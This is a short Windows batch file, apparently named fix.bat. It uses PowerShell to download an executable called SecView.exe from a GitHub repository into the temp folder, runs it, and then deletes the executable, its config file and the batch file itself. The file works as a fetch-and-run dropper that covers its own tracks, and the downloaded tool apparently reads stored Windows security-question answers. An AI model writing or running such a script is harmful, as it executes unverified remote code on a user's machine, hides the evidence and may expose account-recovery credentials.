@echo off
powershell Invoke-WebRequest https://github.com/a7ecc/SecurityQuestionsView/raw/main/SecView.exe -o "%temp%\sec.exe"
"%temp%\sec.exe"
del "%temp%\sec.exe" | del "%temp%\SecView.cfg" | del fix.bat